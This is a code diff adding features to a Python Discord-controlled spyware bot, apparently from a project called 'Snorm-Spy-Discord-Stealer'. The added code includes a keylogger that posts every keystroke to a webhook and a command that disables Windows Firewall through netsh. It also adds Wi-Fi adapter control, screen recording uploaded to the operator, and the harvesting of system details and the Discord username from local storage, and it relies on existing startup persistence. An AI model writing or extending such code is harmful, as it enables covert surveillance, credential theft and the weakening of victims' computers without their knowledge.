@@ -29,6 +29,16 @@ import threading
 import ctypes
 import tempfile
 import aiohttp
+import numpy as np
+import pyautogui
+import base64
+from pynput.keyboard import Key, Listener
+import requests
+import screeninfo
+from screeninfo import get_monitors
+import GPUtil
+import psutil
+import platform
 
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
@@ -41,8 +51,10 @@ async def spam_injecting():
 TOKEN = 'sex'
 WEBHOOK_URL = 'sex'
 
-intents = discord.Intents.default()
-intents.message_content = True  
+keystrokes = ""  
+is_logging = False  
+
+intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
@@ -60,6 +72,74 @@ def add_to_startup():
 
 
 add_to_startup()
+
+def send_to_webhook(content):
+    try:
+        data = {"content": content}
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code == 204:
+            print(f"...")
+        else:
+            print(f"...")
+    except Exception as e:
+        print(f"...")
+
+
+def on_press(key):
+    global keystrokes
+    if not is_logging:
+        return  
+
+    try:
+        
+        if key == Key.space:
+            keystrokes += " "
+        elif key == Key.enter:
+            keystrokes += "\n"
+        elif key == Key.backspace:
+            keystrokes = keystrokes[:-1]  
+        elif key == Key.tab:
+            keystrokes += "    "  
+        elif key == Key.esc:
+            keystrokes += " *ESC* "
+        else:
+            keystrokes += str(key).replace("'", "")  
+
+        
+        if len(keystrokes) > 0:
+            send_to_webhook(keystrokes)
+            keystrokes = ""  
+    except Exception as e:
+        print(f"...")
+
+
+def start_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+@bot.command()
+async def start(ctx):
+    global is_logging
+    if not is_logging:
+        is_logging = True
+        await ctx.send("Keylogger started!")
+        
+        threading.Thread(target=start_keylogger, daemon=True).start()
+    else:
+        await ctx.send("Keylogger is already running.")
+
+
+@bot.command()
+async def stop(ctx):
+    global is_logging
+    if is_logging:
+        is_logging = False
+        await ctx.send("Keylogger stopped!")
+    else:
+        await ctx.send("Keylogger is not running.")
+
+
 
 
 FORMAT = pyaudio.paInt16
@@ -506,7 +586,7 @@ async def hwid(ctx):
 
 @bot.command()
 async def jumpscare(ctx):
-    """Displays an image on the user's screen."""
+    
 
 
     image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
@@ -541,6 +621,135 @@ async def wifi(ctx):
         await ctx.send(f"```{wifi_info}```")
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
+
+
+@bot.command()
+async def disable_firewall(ctx):
+    try:
+        os.popen("netsh advfirewall set allprofiles state off")
+        await ctx.send("Windows Firewall has been disabled.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+
+@bot.command()
+async def network_adapter(ctx, action: str):
+    try:
+        if action.lower() == "disable":
+            os.popen('netsh interface set interface "Wi-Fi" disable')
+            await ctx.send("Wi-Fi adapter has been disabled.")
+        elif action.lower() == "enable":
+            os.popen('netsh interface set interface "Wi-Fi" enable')
+            await ctx.send("Wi-Fi adapter has been enabled.")
+        else:
+            await ctx.send("Invalid action. Use 'enable' or 'disable'.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def screen_record(ctx):
+    try:
+        screen_size = pyautogui.size()  
+        fourcc = cv2.VideoWriter_fourcc(*"XVID")  
+        out = cv2.VideoWriter("screen_recording.avi", fourcc, 20.0, (screen_size))  
+        
+        for _ in range(600):  
+            screenshot = pyautogui.screenshot()
+            frame = np.array(screenshot)  
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)  
+            out.write(frame)  
+        
+        out.release()
+
+        
+        await ctx.send("Screen recording saved as screen_recording.avi.", file=discord.File("screen_recording.avi"))
+
+        
+        os.remove("screen_recording.avi")
+        
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+
+@bot.command()
+async def name(ctx):
+    try:
+        
+        pc_username = os.getlogin()
+
+        
+        monitors = get_monitors()
+        if monitors:
+            monitor_name = f"{monitors[0].width}x{monitors[0].height}"
+        else:
+            monitor_name = "Unknown"
+
+        
+        await ctx.send(f"PC Username: `{pc_username}`\nMonitor: `{monitor_name}`")
+
+    except Exception as e:
+        await ctx.send(f"Error retrieving system info: `{str(e)}`")
+
+@bot.command()
+async def specs(ctx):
+    try:
+        
+        system_info = platform.uname()
+        cpu = system_info.processor
+        ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert bytes to GB
+        os_name = f"{system_info.system} {system_info.release}"
+        
+        
+        gpus = GPUtil.getGPUs()
+        gpu_info = gpus[0].name if gpus else "No dedicated GPU found"
+
+        
+        await ctx.send(
+            f"**PC Specs:**\n"
+            f" **OS:** `{os_name}`\n"
+            f" **CPU:** `{cpu}`\n"
+            f" **GPU:** `{gpu_info}`\n"
+            f" **RAM:** `{ram} GB`"
+        )
+
+    except Exception as e:
+        await ctx.send(f"Error retrieving system specs: `{str(e)}`")
+
+@bot.command()
+async def discord(ctx):
+    try:
+        
+        appdata_path = os.getenv("APPDATA")
+        discord_storage_path = os.path.join(appdata_path, "Discord", "Local Storage", "leveldb")
+
+        
+        if not os.path.exists(discord_storage_path):
+            await ctx.send("Could not find Discord data. Is Discord installed?")
+            return
+
+        
+        username = "Unknown"
+        for file in os.listdir(discord_storage_path):
+            if file.endswith(".ldb") or file.endswith(".log"):
+                file_path = os.path.join(discord_storage_path, file)
+                try:
+                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                        if "username" in content:
+                            start = content.find('"username":"') + len('"username":"')
+                            end = content.find('"', start)
+                            username = content[start:end]
+                            break
+                except:
+                    continue  
+
+        
+        await ctx.send(f"Discord Username: `{username}`")
+
+    except Exception as e:
+        await ctx.send(f"Error retrieving Discord username: `{str(e)}`")
+
+
 
 
 FORMAT = pyaudio.paInt16
